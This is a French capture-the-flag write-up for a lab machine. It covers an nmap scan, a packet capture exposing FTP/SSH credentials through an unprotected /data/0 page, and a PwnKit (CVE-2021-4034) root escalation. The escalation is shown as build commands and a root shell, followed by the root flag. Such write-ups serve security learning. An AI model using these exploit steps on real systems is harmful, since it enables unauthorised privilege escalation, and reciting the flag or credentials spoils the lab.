# User Flag
```bash
$ nmap -sC -sV 10.129.65.135

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 
```
## Exploration des ports
### 21 FTP
Le login `anonymous` est désactivé sur le serveur.
### 80 Gunicorn
Le site tourne sous Gunicorn, qui possède une vulnérabilité [[CVE-2024-1135]]. On n'a pour l'instant pas de page spéciale avec un parefeu.
Les liens ressemblent à des commandes Linux : `/ip`, `/netstat`, mais pour les autres commandes (`whoami`, `ls`, `pwd`...) ça renvoie une erreur.

En allant dans *Security Snapshot*, on est sur la page `.../data/1`, puis `.../data/2`. En allant sur `.../data/0`, on peut télécharger un enregistrement de paquets qu'on analyse dans WireShark.
On y trouve un échange FTP contenant user/password :
```
nathan
Buck3tH4TF0RM3!
```
Il fonctionne pour FTP, fonctionne-t-il pour SSH ? (Oui)
# Root Flag
```bash
$ whoami
nathan
$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
$ sudo -l
# L'utilisateur n'a pas accès à sudo
```
On envoie l'artillerie lourde (linPEAS).
Avec linPEAS et la confirmation d'un [Finder](https://github.com/cyberark/PwnKit-Hunter/blob/main/CVE-2021-4034_Finder.py), la [[CVE-2021-4034]] est confirmée comme fonctionnelle.

En important les codes dans la session de `nathan`, on obtient les accès root facilement :
```bash
nathan@cap:~/cve$ make all
rm -rf 'GCONV_PATH=.' pwn pwnkit
mkdir 'GCONV_PATH=.'
touch GCONV_PATH=.\/pwn
chmod +x GCONV_PATH=.\/pwn
mkdir pwn
echo 'module  UTF-8//    BRUH//    conversion-mod   1' > pwn/gconv-modules
gcc -shared -fPIC -o pwn/conversion-mod.so conversion-mod.c
gcc -o pwnkit pwnkit.c

nathan@cap:~/cve$ ./pwnkit

# whoami
root

# ls /root
root.txt  snap

# cat /root/root.txt
450c2e3e373b96faa8a64629faebbe23
```
